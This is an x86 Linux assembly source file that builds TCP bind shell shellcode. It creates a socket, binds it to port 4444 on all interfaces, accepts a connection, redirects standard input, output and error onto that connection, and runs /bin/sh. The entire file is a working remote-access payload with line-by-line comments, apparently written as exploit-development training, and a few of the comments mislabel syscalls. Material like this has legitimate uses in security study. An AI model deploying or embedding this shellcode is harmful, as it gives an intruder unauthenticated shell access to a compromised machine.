; Author: boku
; Purpose: TCP Bind Shell Shellcode
;  Listens on all IPv4 Interfaces, TCP Port 4444
;  Spawns the shell "/bin/sh" upon connection
global _start

section .text

_start:
; 1. Create a new Socket
; <socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
;   EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x1       ; EBX is set to create a socket
xor ecx, ecx      ; This sets the ECX Register to NULL (all zeros).
push ecx          ; ECX[2]. ECX is NULL, the value needed for the first
                  ;   argument we need to push onto the stack
push ebx          ; ECX[1]. EBX already has the value we need for ECX[1] 
                  ;   we will simply use it to push the value 1.
push dword 0x2    ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
mov ecx, esp      ; ECX now holds the pointer to the beginning of the 
                  ;   argument array stored on the stack.
int 0x80          ; System Call Interrupt 0x80 - Executes socket(). 
                  ;   Creates the Socket.
xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register. 
                  ;   Move it to the ESI Register; we will need it later.

; 2+3. Create TCP-IP Address and Bind the Address to the Socket
; struct sockaddr_in ipSocketAddr = { 
; .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY};
;       ARG[0]               ARG[1]                          ARG[2]
;<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
;  EAX=0x66      EBX   ECX[0]                   ECX[1]                   ECX[2]
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x2       ; EBX is set to create a socket
xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. 
                  ;   We will use this for ECX[1].
push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now 
                  ;   loaded up for ECX[1].
push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp      ; Now we need to point ECX to the top of the loaded stack.
int 0x80          ; System Call Interrupt 0x80

; 4. Listen for incoming connections on TCP-IP Socket.
; <socketcall>   listen( ipv4Socket, 0 );  
;   EAX=0x66      EBX      ECX[0]   ECX[1]  
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x4      ; EBX is set to listen().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.

; 5. Accept the incoming connection, and create a connected session.
; <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL ); 
;   EAX=0x66                     EBX     ECX[0]    ECX[1] ECX[2] 
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall 
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x5      ; EBX is set to accept().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[2]. Push the value 0x0 to the stack.
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
mov ecx, esp     ; Point ECX to the top of the stack.
int 0x80         ; System Call Interrupt 0x80 
xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.

; 5. Transfer STDIN, STDOUT, STDERR to the connected Socket.
; dup2( clientSocket, 0 ); // STDIN 
; dup2( clientSocket, 1 ); // STDOUT
; dup2( clientSocket, 2 ); // STDERR
; EAX       EBX      ECX
xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros).
mov cl, 0x2    ; This sets the loop counter, and
               ;  will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
dup2Loop:      ; Procedure label for the dup2 Loop.
mov al, 0x3f   ; EAX is now 0x0000003F = SYSCALL 63 - dup2
int 0x80       ; System Call Interrupt 0x80 - Executes accept(). 
               ;   Allowing us to create connected Sockets. 
dec ecx        ; Decrements ECX by 1 
jns dup2Loop   ; Jump back to the dup2Loop Procedure until ECX equals 0.

; 7. Spawn a "/bin/sh" shell for the client, in the connected session. 
; execve("/bin//sh", NULL, NULL);
;  EAX      EBX       ECX   EDX
push edx         ; Push NULL to terminate the string.
push 0x68732f2f	 ; "hs//" - Needs to be 4 bytes to fit on stack properly
push 0x6e69622f  ; "nib/" - This is "/bin//sh" backwards.
mov ebx, esp     ; point ebx to stack where /bin//sh +\x00 is located
mov ecx, edx     ; NULL
mov al, 0xb      ; execve System Call Number - 11
int 0x80         ; execute execve with system call interrupt
